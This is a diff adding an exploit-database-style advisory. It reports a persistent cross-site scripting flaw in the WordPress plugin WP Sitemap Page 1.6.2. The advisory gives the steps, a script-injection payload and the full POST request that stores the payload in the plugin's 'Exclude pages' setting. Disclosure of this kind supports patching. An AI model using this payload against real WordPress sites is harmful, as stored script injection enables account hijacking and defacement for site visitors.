@@ -1,0 +1,31 @@
+# Exploit Title: WordPress Plugin WP Sitemap Page 1.6.2 - Persistent Cross-Site Scripting
+# Dork:N/A
+# Date: 2020-02-17
+# Exploit Author: UltraSecurityTeam
+# Team Member = Ashkan Moghaddas , AmirMohammad Safari , Behzad khalife , Milad Ranjbar
+# Vendor Homepage: UltraSec.Org
+# Software Link: https://downloads.wordpress.org/plugin/wp-sitemap-page.zip
+# Tested on: Windows/Linux
+# Version: 1.6.2
+
+
+
+.:: Plugin Description ::.
+An easy way to add a sitemap on one of your pages becomes reality thanks to this WordPress plugin. Just use the shortcode [wp_sitemap_page] on any of your pages. This will automatically generate a sitemap of all your pages and posts
+
+
+.:: Proof Of Concept (PoC) ::.
+
+Step 1 - Open WordPress Setting 
+Step 2 - Open Wp Sitemap Page
+Step 3 - Inject Your Java Script Codes to  Exclude pages 
+Step 4 - Click Button Save Changes
+Step 5 - Run Your Payload
+
+
+.:: Tested Payload ::.
+'>"><script>alert(/XSS By UltraSecurity/)</script>
+
+
+.:: Post Request ::.
+option_page=wp-sitemap-page&action=update&_wpnonce=de5e7c2417&_wp_http_referer=%2Fwp%2Fwp-admin%2Foptions-general.php%3Fpage%3Dwp_sitemap_page%26settings-updated%3Dtrue&wsp_posts_by_category=&wsp_exclude_pages=%27%3E%22%3E%3Cscript%3Ealert%28%2FXSS+By+UltraSecurity%2F%29%3C%2Fscript%3E&wsp_exclude_cpt_archive=1&wsp_exclude_cpt_author=1&submit=Save+Changes
